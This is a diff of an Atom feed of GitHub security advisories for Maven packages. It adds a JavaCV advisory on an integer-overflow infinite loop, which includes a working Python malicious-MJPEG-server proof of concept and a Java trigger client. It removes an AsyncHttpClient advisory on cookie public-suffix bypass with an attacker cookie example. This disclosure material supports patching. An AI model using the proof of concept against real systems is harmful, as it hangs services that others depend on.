@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/maven.rss</id>
     <title>Security Advisory for Java artifacts hosted at the Maven central repository</title>
-    <updated>2026-10-16T17:02:28.180Z</updated>
+    <updated>2026-10-16T20:12:30.136Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven"/>
     <subtitle>Security Advisory for Java artifacts hosted at the Maven central repository on GitHub</subtitle>
@@ -11,6 +11,105 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[org.bytedeco:javacv] JavaCV: Integer Overflow in IPCameraFrameGrabber Causes Infinite-Loop DoS]]></title>
+        <id>https://github.com/advisories/GHSA-rxjv-24xq-76wc</id>
+        <link href="https://github.com/advisories/GHSA-rxjv-24xq-76wc"/>
+        <updated>2026-10-16T19:53:09.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p><code>IPCameraFrameGrabber</code> parses the <code>Content-Length</code> value from the multipart MJPEG HTTP stream returned by the configured IP camera without any bounds checking. A malicious or compromised camera endpoint - or any network attacker able to tamper with the plaintext HTTP response (these streams are conventionally accessed over <code>http://</code>, as documented in the class itself) - can supply a <code>Content-Length</code> value in the range <code>1073741825</code>-<code>2147483647</code>. This drives the internal buffer-growth routine <code>ensureBufferCapacity(int)</code> into 32-bit signed integer overflow, which turns the "grow the buffer" loop into a true infinite loop: the loop variable oscillates to <code>0</code> and never again satisfies the loop's exit condition. The thread that called <code>grab()</code>/<code>grabBufferedImage()</code> spins at 100% CPU forever and never returns, permanently hanging the calling application's frame-grabbing thread with no exception, timeout, or interrupt path available to the caller.</p>
+<h3 id="details">Details</h3>
+<p>File: <code>src/main/java/org/bytedeco/javacv/IPCameraFrameGrabber.java</code></p>
+<pre><code class="language-java">private byte[] readImage() throws IOException {
+    ...
+    int c0 = subheader.indexOf("content-length: ");
+    final int c1 = subheader.indexOf('\r', c0);
+    if (c0 &lt; 0) {
+        throw new EOFException("The camera stream ended unexpectedly");
+    }
+    c0 += 16;
+    final int contentLength = Integer.parseInt(subheader.substring(c0, c1).trim());   // &lt;-- fully attacker-controlled
+    // adaptive size - careful - don't want a 2G jpeg
+    ensureBufferCapacity(contentLength);                                              // &lt;-- no upper bound enforced
+    input.readFully(pixelBuffer, 0, contentLength);
+    ...
+}
+
+private void ensureBufferCapacity(int desiredCapacity) {
+    int capacity = pixelBuffer.length;          // starts at 1024
+    while (capacity &lt; desiredCapacity) {
+        capacity *= 2;                          // &lt;-- unchecked int multiplication
+    }
+    if (capacity &gt; pixelBuffer.length) {
+        pixelBuffer = new byte[capacity];
+    }
+}
+</code></pre>
+<p><code>contentLength</code> is taken verbatim from the HTTP response headers of the camera stream and passed directly into <code>ensureBufferCapacity</code> with no upper-bound validation (the comment "adaptive size - careful - don't want a 2G jpeg" shows the author was aware of the risk but never implemented a check).</p>
+<p><code>ensureBufferCapacity</code> repeatedly doubles <code>capacity</code> (a 32-bit <code>int</code>, starting at <code>pixelBuffer.length == 1024</code>) until it is <code>&gt;= desiredCapacity</code>. If <code>desiredCapacity</code> is greater than <code>2^30</code> (<code>1073741824</code>) but <code>&lt;= Integer.MAX_VALUE</code> (<code>2147483647</code>):</p>
+<ol>
+<li><code>capacity</code> reaches <code>2^30</code> (<code>1073741824</code>) after 20 doublings; the loop condition <code>capacity &lt; desiredCapacity</code> is still true.</li>
+<li><code>capacity *= 2</code> computes <code>2^31</code>, which overflows a signed 32-bit <code>int</code> and wraps to <code>Integer.MIN_VALUE</code> (<code>-2147483648</code>).</li>
+<li>The loop condition <code>capacity &lt; desiredCapacity</code> (a negative number compared to a large positive <code>desiredCapacity</code>) is still true, so the loop continues.</li>
+<li><code>capacity *= 2</code> computes <code>Integer.MIN_VALUE * 2</code>, which in two's-complement 32-bit arithmetic wraps to <code>0</code>.</li>
+<li>From this point on, <code>capacity</code> is permanently <code>0</code> (<code>0 * 2 == 0</code>), and <code>0 &lt; desiredCapacity</code> remains true forever - the <code>while</code> loop never terminates.</li>
+</ol>
+<p>This is a pure CPU-bound loop with no I/O, no blocking call, and no <code>InterruptedException</code> check, so it cannot be interrupted via <code>Thread.interrupt()</code> and will not respect any <code>readTimeout</code>/<code>connectionTimeout</code> configured on the grabber (those only apply to the socket read that happens <em>before</em> this code path). The only remedy is killing the JVM/thread from outside.</p>
+<h3 id="poc">PoC</h3>
+<p>A minimal malicious/MITM'd MJPEG server that reproduces the hang:</p>
+<pre><code class="language-python">import socket
+
+srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+srv.bind(("0.0.0.0", 8080))
+srv.listen(1)
+print("listening on :8080")
+conn, _ = srv.accept()
+conn.recv(4096)  # swallow the client's request
+
+# Any value in (1073741824, 2147483647] triggers the overflow.
+malicious_length = 2000000000
+header = (
+    "--myboundary\r\n"
+    "Content-Type: image/jpeg\r\n"
+    "Content-Length: %d\r\n\r\n" % malicious_length
+)
+conn.sendall(header.encode())
+# The client will now spin forever inside ensureBufferCapacity()
+# before ever attempting to read the (fake) body.
+</code></pre>
+<p>Java client (representative of any application embedding javacv to view an "IP camera" URL):</p>
+<pre><code class="language-java">import org.bytedeco.javacv.IPCameraFrameGrabber;
+import java.util.concurrent.TimeUnit;
+
+public class Poc {
+    public static void main(String[] args) throws Exception {
+        IPCameraFrameGrabber grabber = new IPCameraFrameGrabber(
+            "http://127.0.0.1:8080/videostream.cgi", 5, 5, TimeUnit.SECONDS);
+        grabber.start();
+        grabber.grab(); // never returns; thread pegs a CPU core at 100% forever
+    }
+}
+</code></pre>
+<p>Running the client against the malicious server above causes <code>grab()</code> to hang permanently, consuming a full CPU core, regardless of the <code>startTimeout</code>/<code>grabTimeout</code> passed to the constructor.</p>
+<h3 id="impact">Impact</h3>
+<p>Any application that uses <code>IPCameraFrameGrabber</code> to consume a camera/MJPEG stream from a source that is not fully trusted - including the common case of plain <code>http://</code> streams (as shown in the class's own documented examples: <code>http://host/videostream.cgi?...</code>) that can be tampered with by a network-position attacker - can be forced into a permanent, unrecoverable CPU-spinning hang of the grabbing thread by a single crafted response header. No authentication, JPEG payload, or actual data transfer is required; the malicious header alone is sufficient. Repeated exploitation against a server that spawns a grabber thread per client/camera (a common pattern for video-surveillance/monitoring backends) can exhaust available threads/CPU, resulting in a broader denial of service.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/bytedeco/javacv/security/advisories/GHSA-rxjv-24xq-76wc">https://github.com/bytedeco/javacv/security/advisories/GHSA-rxjv-24xq-76wc</a></li>
+<li><a href="https://github.com/bytedeco/javacv/commit/cd1977800b827beadf3c53c4032e57172845e0b4">https://github.com/bytedeco/javacv/commit/cd1977800b827beadf3c53c4032e57172845e0b4</a></li>
+<li><a href="https://github.com/bytedeco/javacv/releases/tag/1.5.14">https://github.com/bytedeco/javacv/releases/tag/1.5.14</a></li>
+<li><a href="https://github.com/advisories/GHSA-rxjv-24xq-76wc">https://github.com/advisories/GHSA-rxjv-24xq-76wc</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-rxjv-24xq-76wc</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-10-16T19:53:06.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[com.github.junrar:junrar] Junrar: RarVM VM_JMP maxOpCount bypass causes infinite CPU loop during RAR4 extraction]]></title>
         <id>https://github.com/advisories/GHSA-h9h9-2rmf-rvhp</id>
@@ -825,50 +924,5 @@ https://bank.example.com     -&gt;  Cookie: SID=attacker-value
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2026-10-08T16:30:58.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[org.asynchttpclient:async-http-client] AsyncHttpClient: Cookie Domain attribute is not checked against the public suffix list, so a cookie can be set for co.uk]]></title>
-        <id>https://github.com/advisories/GHSA-f9m8-cv68-674w</id>
-        <link href="https://github.com/advisories/GHSA-f9m8-cv68-674w"/>
-        <updated>2026-10-08T16:30:54.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>The cookie store decides whether a <code>Domain</code> attribute may be accepted using only the domain-matching rule of RFC 6265 Section 5.1.3, which asks whether the request host is the domain or ends with a dot followed by it. Section 5.3 step 5, which additionally requires rejecting a <code>Domain</code> that is a public suffix, is not implemented anywhere in the client.</p>
-<p>So a host under a multi-label public suffix can set a cookie for the suffix itself, and the store then hands it to every other host under that suffix:</p>
-<pre><code>attacker.co.uk  -&gt;  Set-Cookie: SID=attacker-value; Domain=co.uk; Path=/
-bank.co.uk      -&gt;  Cookie: SID=attacker-value
-</code></pre>
-<p><code>Domain=uk</code> works the same way. The attacker needs only a site under the same suffix as the victim, which for suffixes such as <code>co.uk</code>, <code>com.au</code>, or <code>github.io</code> is trivially obtainable.</p>
-<p>Depending on what the application does with the cookie, this is session fixation, or it overwrites a session the victim site set, or it lets the attacker plant a value the victim site trusts.</p>
-<h3 id="affected-versions">Affected versions</h3>
-<ul>
-<li>3.x: up to and including 3.0.12</li>
-<li>2.x: up to and including 2.16.0</li>
-</ul>
-<h3 id="relationship-to-cve-2026-55688">Relationship to CVE-2026-55688</h3>
-<p>CVE-2026-55688 (GHSA-m452-q8c9-rg2f) covered the direct form of this, where a host sets a <code>Domain</code> naming an unrelated host, and that form is genuinely fixed: <code>attacker.co.uk</code> can no longer set <code>Domain=bank.co.uk</code>, and this was verified as a control. What that fix did not add is the public suffix test, so setting <code>Domain=co.uk</code> still reaches <code>bank.co.uk</code>. This advisory covers only the residual.</p>
-<h3 id="patches">Patches</h3>
-<p>Fixed in 3.0.13 on the 3.x line. The ICANN section of the Mozilla public suffix list is bundled with the client and a <code>Domain</code> matching it is rejected, honouring the list's wildcard and exception rules. The list is data and goes stale, so a suffix added upstream after a release is not recognised until the bundled copy is refreshed. The 2.x line is not yet fixed.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>Do not share one <code>CookieStore</code> across origins that are not mutually trusted. Supplying a <code>CookieStore</code> implementation that rejects <code>Domain</code> values which are public suffixes also avoids it.</p>
-<h3 id="details">Details</h3>
-<p><code>ThreadSafeCookieStore.domainsMatch</code> is <code>requestDomain.equals(cookieDomain) || requestDomain.endsWith('.' + cookieDomain)</code>. It is used both to accept a <code>Domain</code> on storage and to select cookies for a request, and neither call site consults a public suffix list. A search of the client for any public suffix or effective TLD handling returns nothing.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/AsyncHttpClient/async-http-client/security/advisories/GHSA-f9m8-cv68-674w">https://github.com/AsyncHttpClient/async-http-client/security/advisories/GHSA-f9m8-cv68-674w</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-107280">https://nvd.nist.gov/vuln/detail/CVE-2026-107280</a></li>
-<li><a href="https://github.com/AsyncHttpClient/async-http-client/commit/330267895fe0bdb41bbd027ea6b151d38ee7c23d">https://github.com/AsyncHttpClient/async-http-client/commit/330267895fe0bdb41bbd027ea6b151d38ee7c23d</a></li>
-<li><a href="https://github.com/AsyncHttpClient/async-http-client/commit/d1f0ccec417092098d40242fee7dfac84bb3c21f">https://github.com/AsyncHttpClient/async-http-client/commit/d1f0ccec417092098d40242fee7dfac84bb3c21f</a></li>
-<li><a href="https://github.com/AsyncHttpClient/async-http-client/releases/tag/async-http-client-project-2.16.1">https://github.com/AsyncHttpClient/async-http-client/releases/tag/async-http-client-project-2.16.1</a></li>
-<li><a href="https://github.com/AsyncHttpClient/async-http-client/releases/tag/async-http-client-project-3.0.13">https://github.com/AsyncHttpClient/async-http-client/releases/tag/async-http-client-project-3.0.13</a></li>
-<li><a href="https://github.com/advisories/GHSA-f9m8-cv68-674w">https://github.com/advisories/GHSA-f9m8-cv68-674w</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-f9m8-cv68-674w</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-10-08T16:30:53.000Z</published>
     </entry>
 </feed>
